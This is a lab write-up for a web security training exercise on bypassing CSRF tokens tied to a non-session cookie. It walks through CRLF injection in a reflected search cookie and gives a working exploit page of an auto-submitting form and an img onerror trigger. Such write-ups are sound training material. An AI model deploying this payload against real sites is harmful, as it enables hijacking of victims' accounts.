# Lab: CSRF where token is tied to non-session cookie

**End Goal:** Host an HTML page on the exploit server that uses a CSRF attack to change the viewer's email address.

**Logins:** `wiener:peter` and `carlos:montoya`

**Analysis**

- Access lab --> log in as wiener --> go to **My account**
- DevTools --> **Application** tab --> **Cookies** --> there are two: `session` and `csrfKey`

csrfKey: iTBL3jbjEXBsQKF4yHmPGndHtlW3eOfp
session: 2klPQx75tMt30szOHQ3Y1jPiVO3NDSfu

- View page source of `/my-account` --> the update-email form has a hidden `csrf` token

<input required="" type="hidden" name="csrf" value="lh5RYol2bSmzpaoICG2Ugj4aSv2gnknq">

*The lab name says the token is tied to a non-session cookie. There are exactly two cookies, and `csrfKey` is the non-session one. So the `csrf` token in the form is validated as a pair with the `csrfKey` cookie, not against my session. The flaw: `csrfKey` isn't integrated into session handling, so if I can plant my own `csrfKey` in the victim's browser and submit the `csrf` token that matches it, the server will accept the pair.*

- Note both of my values as a matched pair from this same page load: the `csrfKey` cookie value and the `csrf` token from the form

*Now I need a way to set the victim's `csrfKey` cookie from my exploit page. Look for a cookie-setting gadget.*

- Go to the home page --> run a search for `test` --> in DevTools **Network**, click the search request --> **Response** headers show `Set-Cookie: LastSearchTerm=test`

*The search term is reflected straight into a `Set-Cookie` header with no sanitisation. That's a CRLF injection: if I put `%0d%0a` (a newline) in the search term I can break out of the `LastSearchTerm` line and add my own `Set-Cookie: csrfKey=...` line. The search endpoint has no CSRF protection, so I can trigger it cross-site with an `<img>`. I add `SameSite=None` so the injected cookie is sent on my cross-site form POST.*

- Injection URL (uses my own `csrfKey` value):

```
/?search=test%0d%0aSet-Cookie:%20csrfKey=iTBL3jbjEXBsQKF4yHmPGndHtlW3eOfp%3b%20SameSite=None
```

Encoding: `%0d%0a` = CRLF (ends the header line), `%20` = space, `%3b` = `;`

- Build the exploit: a form that POSTs the email change with my matching `csrf` token, plus an `<img>` that first fires the cookie injection and then, `onerror`, submits the form:

*The image request sets the victim's `csrfKey` cookie to my value. It then "fails" (it's not an image), firing `onerror`, which submits the form. The form carries the `csrf` token that pairs with the `csrfKey` I just planted, so the server accepts it.*

- Click **Go to exploit server** --> paste the HTML (with my real token + csrfKey) --> Store
- **Deliver exploit to victim** --> their `csrfKey` gets overwritten with mine, the form submits with the matching token --> email changes

**Answer:**


<form action="https://0a450024043d43ad800f031f000800b5.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="hacker@evil-user.net">
  <input type="hidden" name="csrf" value="lh5RYol2bSmzpaoICG2Ugj4aSv2gnknq">
</form>
<img src="https://0a450024043d43ad800f031f000800b5.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=iTBL3jbjEXBsQKF4yHmPGndHtlW3eOfp%3b%20SameSite=None" onerror="document.forms[0].submit()">
